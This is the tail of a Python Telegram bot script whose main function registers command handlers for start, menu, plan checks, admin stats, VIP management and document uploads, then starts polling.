async def show_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_start_login(update=update)

def main():
    _fast_print(f"Starting bot with curl_cffi: {HAS_CURL_CFFI}")
    _fast_print("Make sure to install required packages:")
    _fast_print("pip install curl-cffi python-telegram-bot requests")
    
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("checkplan", check_plan))
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("setvip", admin_set_vip))
    application.add_handler(CommandHandler("delvip", admin_del_vip))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.run_polling()

if __name__ == "__main__":
    main()
